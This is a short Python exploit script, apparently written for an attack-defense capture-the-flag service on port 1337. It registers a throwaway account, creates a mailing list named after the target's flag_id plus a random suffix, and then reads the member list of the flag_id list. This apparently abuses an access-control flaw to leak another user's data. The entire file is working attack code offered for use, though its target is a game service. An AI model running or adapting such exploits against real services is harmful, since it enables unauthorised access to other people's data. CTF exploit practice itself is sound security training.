#!/usr/bin/env python3

import sys
from client import Client
import string
import random


PORT = 1337
alphabet = string.ascii_letters + string.digits


def get_random_str(len):
    return ''.join(random.choice(alphabet) for i in range(len))


def exploit(ip, flag_id):
    client = Client(ip, PORT)
    client.connect()
    client.register(get_random_str(20), get_random_str(20), get_random_str(20), get_random_str(20))
    fake_mailinglist = flag_id+get_random_str(5)
    client.create_mailinglist(fake_mailinglist, "")
    res = client.get_mailinglist_users(flag_id)
    return res["users"]



if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))